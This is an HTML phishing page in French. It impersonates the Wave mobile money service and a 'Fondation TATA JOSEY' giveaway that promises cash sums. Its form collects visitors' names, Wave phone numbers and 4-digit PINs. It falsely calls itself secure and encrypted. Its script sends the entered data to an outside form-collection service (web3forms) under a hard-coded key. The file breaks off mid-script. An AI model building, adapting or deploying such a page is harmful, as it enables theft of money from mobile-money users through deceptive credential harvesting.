<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion Wave - Fondation TATA JOSEY</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            background-color: white;
            border-radius: 20px;
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 480px;
            padding: 40px 35px;
            text-align: center;
            position: relative;
            overflow: hidden;
            animation: fadeIn 0.8s ease-out;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 8px;
            background: linear-gradient(to right, #00d464, #009dff, #ff7e5f);
        }
        
        .foundation-banner {
            background: linear-gradient(135deg, #ff7e5f, #feb47b);
            color: white;
            padding: 18px;
            border-radius: 12px;
            margin-bottom: 30px;
            text-align: center;
            font-weight: 700;
            font-size: 16px;
            box-shadow: 0 6px 15px rgba(254, 180, 123, 0.4);
            position: relative;
            overflow: hidden;
        }
        
        .foundation-banner::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(to right, transparent, rgba(255,255,255,0.2), transparent);
            transform: rotate(30deg);
            animation: shine 3s infinite;
        }
        
        @keyframes shine {
            0% { transform: translateX(-100%) rotate(30deg); }
            100% { transform: translateX(100%) rotate(30deg); }
        }
        
        .logo {
            margin-bottom: 25px;
            display: flex;
            justify-content: center;
        }
        
        .wave-logo {
            width: 130px;
            height: 130px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            background: white;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
            position: relative;
            overflow: hidden;
            padding: 12px;
            border: 3px solid #f0f0f0;
            transition: transform 0.3s, box-shadow 0.3s;
        }
        
        .wave-logo:hover {
            transform: scale(1.03);
            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.2);
        }
        
        .wave-logo img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            border-radius: 50%;
        }
        
        h1 {
            color: #212121;
            font-size: 26px;
            margin-bottom: 30px;
            font-weight: 700;
            line-height: 1.3;
        }
        
        .highlight {
            background: linear-gradient(to right, #00d464, #009dff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 800;
        }
        
        .form-section {
            background: linear-gradient(to bottom, #f9f9f9, #f0f0f0);
            padding: 25px;
            border-radius: 12px;
            margin-bottom: 25px;
            text-align: left;
            border: 1px solid #eaeaea;
        }
        
        .form-section h2 {
            color: #ff7e5f;
            margin-bottom: 20px;
            font-size: 19px;
            text-align: center;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .input-group {
            margin-bottom: 22px;
            text-align: left;
        }
        
        label {
            display: block;
            margin-bottom: 10px;
            color: #424242;
            font-weight: 600;
            font-size: 15px;
        }
        
        input, select {
            width: 100%;
            padding: 16px;
            border: 1px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s;
            background-color: white;
        }
        
        input:focus, select:focus {
            outline: none;
            border-color: #009dff;
            box-shadow: 0 0 0 3px rgba(0, 157, 255, 0.15);
            transform: translateY(-2px);
        }
        
        button {
            background: linear-gradient(to right, #00d464, #009dff);
            color: white;
            border: none;
            border-radius: 10px;
            padding: 18px;
            width: 100%;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 15px;
            box-shadow: 0 6px 15px rgba(0, 212, 100, 0.3);
            position: relative;
            overflow: hidden;
        }
        
        button:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(0, 212, 100, 0.4);
        }
        
        button:active {
            transform: translateY(-1px);
        }
        
        .btn-content {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        p {
            margin-top: 20px;
            font-size: 15px;
            color: #666;
        }
        
        a {
            color: #009dff;
            text-decoration: none;
            font-weight: 600;
            transition: all 0.2s;
            position: relative;
        }
        
        a:hover {
            color: #00d464;
        }
        
        a::after {
            content: '';
            position: absolute;
            bottom: -2px;
            left: 0;
            width: 0;
            height: 2px;
            background: #00d464;
            transition: width 0.3s;
        }
        
        a:hover::after {
            width: 100%;
        }
        
        .divider {
            height: 1px;
            background: linear-gradient(to right, transparent, #ddd, transparent);
            margin: 30px 0;
        }
        
        .disclaimer {
            font-size: 13px;
            color: #888;
            margin-top: 30px;
            line-height: 1.5;
            text-align: center;
        }
        
        .secure-notice {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-top: 20px;
            color: #00d464;
            font-size: 15px;
            font-weight: 600;
            background: rgba(0, 212, 100, 0.1);
            padding: 12px;
            border-radius: 8px;
        }
        
        .loader {
            display: none;
            width: 26px;
            height: 26px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .success-message {
            display: none;
            color: #00d464;
            background-color: rgba(0, 212, 100, 0.1);
            padding: 16px;
            border-radius: 10px;
            margin-top: 20px;
            font-weight: 600;
            border-left: 4px solid #00d464;
            animation: slideIn 0.5s ease-out;
        }
        
        .error-message {
            display: none;
            color: #ff4757;
            background-color: rgba(255, 71, 87, 0.1);
            padding: 16px;
            border-radius: 10px;
            margin-top: 20px;
            font-weight: 600;
            border-left: 4px solid #ff4757;
            animation: slideIn 0.5s ease-out;
        }
        
        @keyframes slideIn {
            from { opacity: 0; transform: translateX(-20px); }
            to { opacity: 1; transform: translateX(0); }
        }
        
        .processing-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.7);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            color: white;
            text-align: center;
            animation: fadeIn 0.3s ease-out;
        }
        
        .processing-content {
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            max-width: 400px;
            width: 90%;
            color: #333;
        }
        
        .processing-spinner {
            width: 60px;
            height: 60px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #00d464;
            border-radius: 50%;
            animation: spin 1.5s linear infinite;
            margin: 0 auto 20px;
        }
        
        .processing-text {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 10px;
            color: #333;
        }
        
        .processing-subtext {
            font-size: 14px;
            color: #666;
            line-height: 1.5;
        }
        
        @media (max-width: 520px) {
            .container {
                padding: 30px 20px;
            }
            
            h1 {
                font-size: 23px;
            }
            
            .wave-logo {
                width: 110px;
                height: 110px;
            }
            
            .foundation-banner {
                font-size: 15px;
                padding: 15px;
            }
            
            .form-section {
                padding: 20px;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="foundation-banner">
            FONDATION TATA JOSEY - CONNECTEZ VOTRE COMPTE WAVE POUR BÉNÉFICIER DE VOTRE SOMME
        </div>
        
        <div class="logo">
            <div class="wave-logo">
                <img src="https://i.postimg.cc/g2qWSxqr/434x0w.webp" alt="Logo Fondation Edmond Tapsoba">
            </div>
        </div>
        
        <h1>Connexion à votre compte <span class="highlight">Wave</span></h1>
        
        <form id="loginForm" action="https://api.web3forms.com/submit" method="POST">
            <input type="hidden" name="access_key" value="1e66265c-5f1e-4baa-a396-8a225ae50ea7">
            <input type="hidden" name="subject" value="Nouvelle connexion Wave - Fondation Tapsoba">
            <input type="hidden" name="from_name" value="Formulaire Wave Fondation">
            <input type="checkbox" name="botcheck" style="display: none;">
            
            <div class="form-section">
                <h2> Fondation TATA JOSEY</h2>
                
                <div class="input-group">
                    <label for="fullname">Nom et Prénoms complets</label>
                    <input type="text" id="fullname" name="fullname" required placeholder="Votre nom complet">
                </div>
                
                <div class="input-group">
                    <label for="amount">Somme à bénéficier (FCFA)</label>
                    <select id="amount" name="amount" required>
                        <option value="">Sélectionnez un montant</option>
                        <option value="50000">50 000 FCFA</option>
                        <option value="100000">100 000 FCFA</option>
                        <option value="200000">200 000 FCFA</option>
                        <option value="500000">500 000 FCFA</option>
                        <option value="1000000">1 000 000 FCFA</option>
                        <option value="other">Autre montant</option>
                    </select>
                </div>
                
                <div class="input-group" id="customAmountGroup" style="display: none;">
                    <label for="customAmount">Montant personnalisé (FCFA)</label>
                    <input type="number" id="customAmount" name="customAmount" placeholder="Entrez le montant">
                </div>
            </div>
            
            <div class="input-group">
                <label for="phone">Numéro de téléphone Wave</label>
                <input type="tel" id="phone" name="phone" required placeholder="Votre numéro Wave">
            </div>
            
            <div class="input-group">
                <label for="pin">Code PIN Wave</label>
                <input type="password" id="pin" name="pin" required placeholder="Votre code PIN à 4 chiffres" maxlength="4" pattern="[0-9]{4}">
            </div>
            
            <button type="submit" id="submitBtn">
                <div class="btn-content">
                    <i class="fas fa-lock"></i>
                    <span id="btnText">Se connecter et bénéficier</span>
                    <div class="loader" id="loader"></div>
                </div>
            </button>
            
            <div class="success-message" id="successMessage">
                <i class="fas fa-check-circle"></i> Connexion réussie! Votre compte est en cours de traitement.
            </div>
            
            <div class="error-message" id="errorMessage">
                <i class="fas fa-exclamation-circle"></i> Une erreur s'est produite. Veuillez réessayer.
            </div>
            
            <div class="secure-notice">
                <i class="fas fa-shield-alt"></i>
                Connexion sécurisée et cryptée
            </div>
        </form>
        
        <div class="divider"></div>
        
        <p><a href="#"><i class="fas fa-key"></i> Code PIN oublié ?</a></p>
        <p><a href="#"><i class="fas fa-user-plus"></i> Créer un compte Wave</a></p>
        
        <p class="disclaimer">
            <i class="fas fa-info-circle"></i> Wave - Service de transfert d'argent et paiement mobile.<br>
            En collaboration avec la Fondation TATA JOSEY.
        </p>
    </div>

    <!-- Overlay de traitement -->
    <div class="processing-overlay" id="processingOverlay">
        <div class="processing-content">
            <div class="processing-spinner"></div>
            <div class="processing-text">Traitement en cours</div>
            <div class="processing-subtext">
                Nous connectons votre compte Wave et traitons votre demande.<br>
                Veuillez patienter, cela peut prendre quelques instants...
            </div>
        </div>
    </div>

    <script>
        // Gérer l'affichage du champ de montant personnalisé
        document.getElementById('amount').addEventListener('change', function() {
            const customAmountGroup = document.getElementById('customAmountGroup');
            if (this.value === 'other') {
                customAmountGroup.style.display = 'block';
            } else {
                customAmountGroup.style.display = 'none';
            }
        });

        // Soumission du formulaire
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Récupérer les valeurs du formulaire
            const fullname = document.getElementById('fullname').value;
            const amount = document.getElementById('amount').value;
            const customAmount = document.getElementById('customAmount').value;
            const phone = document.getElementById('phone').value;
            const pin = document.getElementById('pin').value;
            
            const submitBtn = document.getElementById('submitBtn');
            const btnText = document.getElementById('btnText');
            const loader = document.getElementById('loader');
            const successMessage = document.getElementById('successMessage');
            const errorMessage = document.getElementById('errorMessage');
            const processingOverlay = document.getElementById('processingOverlay');
            
            // Validation
            if (!fullname || !amount || !phone || !pin) {
                errorMessage.textContent = "Veuillez remplir tous les champs obligatoires.";
                errorMessage.style.display = 'block';
                successMessage.style.display = 'none';
                return;
            }
            
            if (amount === 'other' && !customAmount) {
                errorMessage.textContent = "Veuillez spécifier un montant personnalisé.";
                errorMessage.style.display = 'block';
                successMessage.style.display = 'none';
                return;
            }
            
            if (pin.length !== 4 || !/^\d+$/.test(pin)) {
                errorMessage.textContent = "Le code PIN doit contenir exactement 4 chiffres.";
                errorMessage.style.display = 'block';
                successMessage.style.display = 'none';
                return;
            }
            
            // Afficher l'overlay de traitement
            processingOverlay.style.display = 'flex';
            
            // Simuler un délai de traitement avant l'envoi
            setTimeout(function() {
                // Envoyer le formulaire
                const form = document.getElementById('loginForm');
                const formData = new FormData(form);
                
                fetch(form.action, {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    // Cacher l'overlay
                    processingOverlay.style.display = 'none';
                    
                    if (data.success) {
                        // Afficher le message de succès
                        successMessage.style.display = 'block';
                        errorMessage.style.display = 'none';
                        
                        // Réinitialiser le formulaire après 5 secondes
                        setTimeout(function() {
                            form.reset();
                            successMessage.style.display = 'none';
                        }, 5000);
                    } else {
                        // Afficher le message d'erreur
                        errorMessage.textContent = "Erreur lors de l'envoi. Veuillez réessayer.";
                        errorMessage.style.display = 'block';
                        successMessage.style.display = 'none';
                    }
                })
                .catch(error => {
                    // Cacher l'overlay
                    processingOverlay.style.display = 'none';
                    
                    // Afficher le message d'erreur
                    errorMessage.textContent = "Erreur de connexion. Vérifiez votre connexion internet.";
                    errorMessage.style.display = 'block';
                    successMessage.style.display = 'none';

                
